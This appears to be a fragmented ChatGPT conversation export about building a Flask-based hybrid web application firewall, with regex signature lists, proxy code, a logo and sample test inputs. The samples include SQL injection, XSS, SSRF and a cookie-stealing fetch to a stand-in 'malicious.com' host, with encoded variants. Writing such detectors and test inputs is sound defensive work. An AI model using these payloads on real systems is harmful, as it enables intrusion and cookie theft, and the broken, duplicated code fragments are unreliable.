    feature_names = ["feature1", "feature2", "feature3", "feature4"]  # Replace with actual names
    features_df = pd.DataFrame([features], columns=feature_names)  

    # Make prediction
    prediction = model.predict(features_df)[0]
    return prediction

Why does this work?

  • Fixes feature name mismatch by ensuring LightGBM gets a DataFrame.

  • Prevents warnings and keeps ML predictions clean.

The fact that you're still seeing:

What Might Be Happening

  • Signature Checker Behavior:
    Your current implementation of check_signature only returns "malicious" if it finds a match, and "valid" if it doesn't. It never returns "obfuscated" unless you explicitly program it to detect obfuscation (for example, by looking for URL encoding or other signs of obfuscation).

  • Input Testing:
    If youâ€™re testing with a normal string (even if itâ€™s suspicious), it might not trigger any of your malicious patterns. To see the "obfuscated" flow, you must provide input that the signature checker interprets as obfuscated.

What to Do

  1. Update Signature Checker for Obfuscation (for testing purposes):
    You can modify your signature_checker.py to simulate obfuscation detection. For example, if the input contains a "%" character (often seen in URL encoding), you could return "obfuscated".

    Updated signature_checker.py:

    python
    import re

# Define malicious patterns (expand as needed)
MALICIOUS_PATTERNS = [
    r"(?:\bunion\b|\bselect\b|\binsert\b|\bdelete\b|\bdrop\b|\bupdate\b).*?\bfrom\b",  # SQL Injection
    r"(\bscript\b|<script>)",  # XSS Attack
    r"(\balert\b|\bconsole\.log\b)",  # JavaScript-based attacks
    r"(?:--)|(/\*.*?\*/)|(#.*?\n)",  # Comment-based SQL Injection
]

def check_signature(user_input: str) -> str:
    """
    Checks if the user request matches any patterns.
    Returns:
        - "malicious" if a direct malicious pattern is found,
        - "obfuscated" if the input seems encoded/suspicious,
        - "valid" if nothing is detected.
    """
    user_input = " ".join(user_input.split())  # Normalize input
    
    for pattern in MALICIOUS_PATTERNS:
        if re.search(pattern, user_input, re.IGNORECASE):
            return "malicious"  # Directly detected attack
    
    # For demonstration: if the input contains a "%" (URL encoding), consider it obfuscated.
    if "%" in user_input:
        return "obfuscated"
    
    return "valid"  # No issues detected

    %55nion%20Select%20password%20from%20users

app = Flask(__name__)

def check_request():
    data = request.get_json()
    user_input = data.get("user_request", "")

    signature_result = check_signature(user_input)  # First check using signature-based

        ml_verdict = predict_malicious(user_input)  # Send to ML model

            "status": "obfuscated",
            "message": "Obfuscated request detected! Sent to ML model.",
            "ml_verdict": ml_verdict
        })
    
    return jsonify({"status": "valid", "message": "âœ… Valid Request (Signature Check)"})

if __name__ == "__main__":
    app.run(debug=True)

import re

def check_signature(user_input: str):
    user_input = " ".join(user_input.split())  # Normalize input
    
    for pattern in MALICIOUS_PATTERNS:
        if re.search(pattern, user_input, re.IGNORECASE):
            print(f"[DEBUG] Matched MALICIOUS pattern: {pattern} in {user_input}")
            return "malicious"

        if re.search(pattern, user_input, re.IGNORECASE):
            print(f"[DEBUG] Matched OBFUSCATION pattern: {pattern} in {user_input}")
            return "obfuscated"

    return "valid"

from flask import Flask, request, jsonify
from src.hybrid_waf.signature_checker import check_signature

app = Flask(__name__)

@app.route("/check_request", methods=["POST"])
def check_request():
    try:
        # âœ… Ensure valid JSON is received
        data = request.get_json()
        if not data or "user_request" not in data:
            return jsonify({"status": "error", "message": "Invalid JSON request. Missing 'user_request' key."}), 400
        
        user_input = data["user_request"]
        result = check_signature(user_input)
        
        return jsonify({"status": result, "message": "Detected by Signature-Based Filter!" if result != "valid" else "âœ… Valid Request (Signature Check)"})
    
    except Exception as e:
        return jsonify({"status": "error", "message": f"Server error: {str(e)}"}), 500

if __name__ == "__main__":
    app.run(debug=True)

ðŸ”¹ Fixes in This Code

âœ” Handles missing JSON data â†’ Returns an error if user_request key is missing.
âœ” Catches exceptions â†’ Prevents server crashes.

âœ… Fixing the Response Messages in proxy.py

Update proxy.py to reflect the new structured response format that matches your frontend logic.

ðŸ”¹ Updated proxy.py

python
from flask import Blueprint, request, jsonify
from src.hybrid_waf.utils.signature_checker import check_signature

proxy_bp = Blueprint('proxy', __name__)

@proxy_bp.route('/check_request', methods=['POST'])
def check_request():
    data = request.get_json()
    
    user_input = data.get("user_request", "")
    uri = data.get("uri", user_input)
    get_data = data.get("get_data", "")
    post_data = data.get("post_data", "")
    
    # --- Step 1: Signature-Based Detection ---
    signature_result = check_signature(user_input)
    
    if signature_result == "valid":
        return jsonify({
            "status": "valid",
            "message": "âœ… Request Passed Signature Check"
        })

    if signature_result == "malicious":
        return jsonify({
            "status": "malicious",
            "message": "ðŸš¨ **Threat Detected!** Signature-based filter flagged this request."
        })
    
    # --- Step 2: ML-Based Anomaly Detection (Only for obfuscated requests) ---
    if signature_result == "obfuscated":
        from src.hybrid_waf.utils.preprocessor import extract_features
        from src.hybrid_waf.utils.ml_checker import check_ml_prediction
        
        features = extract_features(uri, get_data, post_data)
        prediction = check_ml_prediction(features)
        
        final_status = "malicious" if prediction == 1 else "valid"
        
        return jsonify({
            "status": "obfuscated",
            "ml_verdict": "ðŸš¨ **Threat Confirmed!** Detected via ML" if final_status == "malicious" else "âœ… **ML Cleared Request**",
            "message": "âš ï¸ Suspicious request flagged! Further analysis required.",
            "features": features
        })

ðŸ”¹ What This Fix Does

âœ” Matches new home.js structure (so UI updates properly).
âœ” Uses emojis & bold text for better UI feedback.
âœ” Ensures obfuscated responses include ml_verdict (used in home.js).

âœ… Next Steps

    CTRL + C  # Stop server

# Define known malicious patterns (expanded)

    r"(?i)union\s+select", r"(?i)drop\s+table", r"(?i)or\s+1=1", r"--",

    r"' and ascii\(", r"' group by columnnames having 1=1--", 
    r"' and extractvalue\(", r"(?i)or\s+'a'='a", r"(?i)1 or 1=1",

    r"' OR '1'='1'--", r"(?i)select\s+@@version", r"(?i)select\s+@@datadir", 
    r"(?i)select\s+load_file", r"(?i)select\s+user\(\)", 
    r"(?i)select\s+database\(\)", r"\" OR \"1\"=\"1", r"\' OR \'1\'=\'1",
    
    # XSS Attacks
    r"(?i)<script>", r"(?i)<img src=", r"(?i)onerror=", r"(?i)alert\(", 
    r"(?i)document\.cookie", r"javascript:", r"(?i)<iframe>", r"(?i)<svg>", 
    r"(?i)onmouseover=", r"(?i)onload=", r"(?i)eval\(", r"settimeout\(", 
    r"setinterval\(", r"(?i)innerhtml=", r"(?i)srcdoc=", 
    r"(?i)<link rel=stylesheet href=", r"fetch\(", r"xhr\.open\(", 
    r"window\.location=", r"self\.location=", r"(?i)prompt\(",

    r"(?i)<div>", r"(?i)<span>", r"(?i)<input", r"(?i)<form",

    r"localhost:8080", r"127\.0\.0\.1:3306", r"http://10\.", 
    r"http://192\.168\."
]

# Define obfuscation patterns (expanded)
OBFUSCATION_PATTERNS = [
    r"(%[0-9A-Fa-f]{2})+",  # URL encoding
    r"(\\x[0-9A-Fa-f]{2})+",  # Hex encoding
    r"(\bchar\b|\bconcat\b|\bsubstr\b)",  # SQL obfuscation functions
    r"(\bbase64_decode\b|\bbase64_encode\b)",  # Base64 encoding
    r"(\\u[0-9A-Fa-f]{4})+",  # Unicode escape sequences
    r"(\bfromCharCode\b)",  # JavaScript obfuscation
    r"(\bROT13\b)",  # ROT13 encoding
    r"(\bdecodeURIComponent\b|\bencodeURIComponent\b)",  # URI encoding
    r"(\bhexToInt\b|\bcharCodeAt\b)",  # Character conversion tricks
    r"(\\bXOR\\b|\bXOR\b)",  # XOR encoding
    r"(\bmd5\b|\bsha1\b|\bsha256\b)",  # Hash-based obfuscation
    r"(\bblind_sql\b|\btime_delay\b)",  # Blind SQL injection techniques
    r"(\bcase when\b|\bcase\b|\bthen\b)",  # SQL CASE obfuscation
    r"(?:--)|(/\*.*?\*/)|(#.*?\n)",  # Comment-based SQL obfuscation
]

def check_signature(user_input: str):
    """
    Checks if the user request matches malicious or obfuscation patterns.
    Returns:
        - "malicious" if it's an attack
        - "obfuscated" if it looks suspicious
        - "valid" if nothing is detected
    """
    user_input = " ".join(user_input.split())  # Normalize input
    
    for pattern in MALICIOUS_PATTERNS:
        if re.search(pattern, user_input, re.IGNORECASE):
            return "malicious"  # Directly detected attack
    
    for pattern in OBFUSCATION_PATTERNS:
        if re.search(pattern, user_input, re.IGNORECASE):
            return "obfuscated"  # Suspicious but needs further analysis

    return "valid"  # No issues detected

  • More SQL Injection detection (advanced queries, UNION, SELECT, comments)

  • More XSS, CSRF, and SSRF patterns

  • Expanded obfuscation detection (URL encoding, Base64, ROT13, XOR, Unicode, JavaScript)

  • Maintains your existing structure (so it fits smoothly in your hybrid WAF)

Let me know if you need further improvements! ðŸš€

Here are 5 examples for each category:

âœ… Valid Inputs (Safe & Normal Usage)

  1. Hello, I would like to reset my password.

  2. SELECT name FROM employees WHERE department='HR'; (Legitimate SQL query for HR data retrieval in an internal tool.)

  3. <p>Welcome to our website!</p> (Properly structured HTML for a webpage.)

  4. https://example.com/profile?id=1234 (A normal URL parameter in a GET request.)

  5. {"username": "john_doe", "password": "secure123"} (A standard JSON payload for login.)

ðŸš¨ Malicious Inputs (Attacks Detected)

  1. '; DROP TABLE users;-- (SQL Injection - Deletes the "users" table.)

  2. <script>alert('Hacked!');</script> (XSS Attack - Injects JavaScript to trigger an alert.)

  3. file:///etc/passwd (SSRF Attack - Attempts to access sensitive system files.)

  4. fetch("http://malicious.com/steal?cookie=" + document.cookie) (CSRF Attack - Exfiltrates cookies via JavaScript.)

  5. http://169.254.169.254/latest/meta-data/ (SSRF Attack - Tries to access AWS instance metadata.)

ðŸ•µ Obfuscated Inputs (Suspicious & Hidden Intent)

  1. %27%3B%20DROP%20TABLE%20users%3B-- (URL Encoded SQL Injection - Equivalent to '; DROP TABLE users;--.)

  2. <svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)> (Hex-encoded XSS - Equivalent to <svg onload=alert(1)>.)

  3. SELECT * FROM users WHERE username = char(97,100,109,105,110); (SQL Injection using CHAR() function to construct "admin".)

  4. \x3Cscript\x3Ealert(1)\x3C/script\x3E (Hex-encoded JavaScript payload for XSS.)

  5. eval(String.fromCharCode(97,108,101,114,116,40,49,41)); (JavaScript obfuscation to execute alert(1).)

These examples cover real-world attack scenarios, safe user inputs, and obfuscation techniques hackers use to bypass filters. ðŸš€ Let me know if you need more!

ChatGPT said:

Below is an example of a sleek, cybersecurity-inspired "WAFinity" logo created with inline SVG and CSS. You can customize the colors, font, and styling as needed.

html
<!-- WAFinity Logo -->
<svg width="300" height="100" viewBox="0 0 300 100" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <!-- Gradient for a modern, cyber look -->
    <linearGradient id="cyberGradient" x1="0%" y1="0%" x2="100%" y2="0%">
      <stop offset="0%" style="stop-color:#00d4ff;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#0073e6;stop-opacity:1" />
    </linearGradient>
    <!-- Optional drop shadow filter -->
    <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%">
      <feDropShadow dx="2" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.5"/>
    </filter>
  </defs>
  <!-- Text element with gradient fill and shadow -->
  <text x="50%" y="50%" text-anchor="middle" fill="url(#cyberGradient)" font-size="48" font-family="Roboto, sans-serif" font-weight="bold" dy=".35em" filter="url(#shadow)">
    WAFinity
  </text>
</svg>

Explanation:

  • SVG Container: The <svg> element is set to 300x100 pixels, and the viewBox is defined accordingly.

  • Linear Gradient: A horizontal gradient (cyberGradient) is created, transitioning from a bright cyan (#00d4ff) to a deep blue (#0073e6) to evoke a futuristic, tech vibe.

  • Drop Shadow: An optional drop shadow filter is applied to give the logo some depth.

  • Text Element: The <text> element centers the word "WAFinity" using text-anchor="middle" and positions it with x="50%" and y="50%". The font settings are chosen for a modern look.

You can embed this SVG code directly into your HTML for your landing page. Let me know if you need any adjustments!
